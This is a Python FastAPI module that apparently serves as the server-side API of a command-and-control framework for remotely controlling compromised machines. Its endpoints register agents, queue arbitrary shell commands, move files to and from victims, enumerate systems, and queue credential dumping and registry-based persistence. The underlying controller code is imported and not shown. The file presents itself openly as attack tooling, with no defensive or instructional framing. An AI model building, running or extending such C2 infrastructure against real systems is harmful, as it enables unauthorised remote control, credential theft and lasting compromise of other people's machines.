"""
C2 API Endpoints
REST API for C2 controller operations
"""

from fastapi import APIRouter, HTTPException, Depends
from typing import Dict, List, Any, Optional
from pydantic import BaseModel
import structlog

from app.services.c2.controller import C2Controller
from app.services.c2.session import C2Session

logger = structlog.get_logger()

router = APIRouter()

# Global C2 controller instance
c2_controller = C2Controller()


# Request/Response Models

class AgentRegistration(BaseModel):
    """Agent registration request"""
    agent_id: str
    hostname: str
    ip: str
    os_info: str
    username: str


class TaskRequest(BaseModel):
    """Task creation request"""
    task_type: str
    params: Dict[str, Any]


class TaskResult(BaseModel):
    """Task result submission"""
    agent_id: str
    task_id: str
    result: Dict[str, Any]


class ShellCommand(BaseModel):
    """Shell command execution request"""
    command: str


class FileTransfer(BaseModel):
    """File transfer request"""
    local_path: str
    remote_path: str


# API Endpoints

@router.post("/c2/register")
async def register_agent(registration: AgentRegistration):
    """
    Register a new C2 agent

    Creates a new C2 session for the agent.
    """
    try:
        session = c2_controller.register_agent(
            agent_id=registration.agent_id,
            hostname=registration.hostname,
            ip=registration.ip,
            os_info=registration.os_info,
            username=registration.username
        )

        return {
            "status": "success",
            "session_id": session.session_id,
            "encryption_key": session.encryption_key,
            "message": "Agent registered successfully"
        }

    except Exception as e:
        logger.error("Agent registration error", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/c2/sessions")
async def get_sessions(active_only: bool = False):
    """
    Get all C2 sessions

    Args:
        active_only: Return only active sessions
    """
    try:
        if active_only:
            sessions = c2_controller.get_active_sessions()
        else:
            sessions = c2_controller.get_all_sessions()

        return {
            "status": "success",
            "count": len(sessions),
            "sessions": [s.to_dict() for s in sessions]
        }

    except Exception as e:
        logger.error("Error getting sessions", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/c2/sessions/{session_id}")
async def get_session(session_id: str):
    """Get specific C2 session"""
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        return {
            "status": "success",
            "session": session.to_dict()
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error("Error getting session", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/tasks")
async def send_task(session_id: str, task: TaskRequest):
    """
    Send task to agent

    Args:
        session_id: Target session ID
        task: Task details
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_obj = c2_controller.send_task(
            agent_id=session.agent_id,
            task_type=task.task_type,
            task_params=task.params
        )

        return {
            "status": "success",
            "task": task_obj
        }

    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        logger.error("Error sending task", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/c2/tasks/{agent_id}")
async def get_tasks(agent_id: str):
    """
    Get pending tasks for agent (called by agent)

    Args:
        agent_id: Agent ID
    """
    try:
        tasks = c2_controller.get_pending_tasks(agent_id)

        return {
            "status": "success",
            "count": len(tasks),
            "tasks": tasks
        }

    except Exception as e:
        logger.error("Error getting tasks", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/results")
async def submit_result(result: TaskResult):
    """
    Submit task result (called by agent)

    Args:
        result: Task result data
    """
    try:
        c2_controller.submit_task_result(
            agent_id=result.agent_id,
            task_id=result.task_id,
            result=result.result
        )

        return {
            "status": "success",
            "message": "Result received"
        }

    except Exception as e:
        logger.error("Error submitting result", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/c2/results/{agent_id}")
async def get_results(agent_id: str, task_id: Optional[str] = None):
    """
    Get task results for agent

    Args:
        agent_id: Agent ID
        task_id: Optional specific task ID
    """
    try:
        results = c2_controller.get_task_results(agent_id, task_id)

        return {
            "status": "success",
            "count": len(results),
            "results": results
        }

    except Exception as e:
        logger.error("Error getting results", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.delete("/c2/sessions/{session_id}")
async def terminate_session(session_id: str):
    """
    Terminate a C2 session

    Args:
        session_id: Session to terminate
    """
    try:
        c2_controller.terminate_session(session_id)

        return {
            "status": "success",
            "message": "Session terminated"
        }

    except Exception as e:
        logger.error("Error terminating session", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/c2/dashboard")
async def get_dashboard():
    """
    Get C2 dashboard statistics
    """
    try:
        # Cleanup dead sessions first
        c2_controller.cleanup_dead_sessions()

        stats = c2_controller.get_dashboard_stats()

        return {
            "status": "success",
            "dashboard": stats
        }

    except Exception as e:
        logger.error("Error getting dashboard", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


# High-level operations

@router.post("/c2/sessions/{session_id}/shell")
async def execute_shell(session_id: str, cmd: ShellCommand):
    """
    Execute shell command on agent

    Args:
        session_id: Target session
        cmd: Shell command
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.execute_shell_command(
            agent_id=session.agent_id,
            command=cmd.command
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Shell command queued"
        }

    except Exception as e:
        logger.error("Error executing shell command", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/download")
async def download_file(session_id: str, transfer: FileTransfer):
    """
    Download file from agent

    Args:
        session_id: Target session
        transfer: File transfer details
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.download_file(
            agent_id=session.agent_id,
            remote_path=transfer.remote_path,
            local_path=transfer.local_path
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Download queued"
        }

    except Exception as e:
        logger.error("Error downloading file", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/upload")
async def upload_file(session_id: str, transfer: FileTransfer):
    """
    Upload file to agent

    Args:
        session_id: Target session
        transfer: File transfer details
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.upload_file(
            agent_id=session.agent_id,
            local_path=transfer.local_path,
            remote_path=transfer.remote_path
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Upload queued"
        }

    except Exception as e:
        logger.error("Error uploading file", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/enumerate")
async def enumerate_system(session_id: str):
    """
    Enumerate system information

    Args:
        session_id: Target session
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.enumerate_system(
            agent_id=session.agent_id
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Enumeration queued"
        }

    except Exception as e:
        logger.error("Error enumerating system", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/dump-creds")
async def dump_credentials(session_id: str, method: str = "auto"):
    """
    Dump credentials from agent

    Args:
        session_id: Target session
        method: Credential dumping method
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.dump_credentials(
            agent_id=session.agent_id,
            method=method
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Credential dumping queued"
        }

    except Exception as e:
        logger.error("Error dumping credentials", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/c2/sessions/{session_id}/persistence")
async def establish_persistence(session_id: str, method: str = "registry"):
    """
    Establish persistence on agent

    Args:
        session_id: Target session
        method: Persistence method
    """
    try:
        session = c2_controller.get_session(session_id)

        if not session:
            raise HTTPException(status_code=404, detail="Session not found")

        task_id = await c2_controller.establish_persistence(
            agent_id=session.agent_id,
            method=method
        )

        return {
            "status": "success",
            "task_id": task_id,
            "message": "Persistence queued"
        }

    except Exception as e:
        logger.error("Error establishing persistence", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))
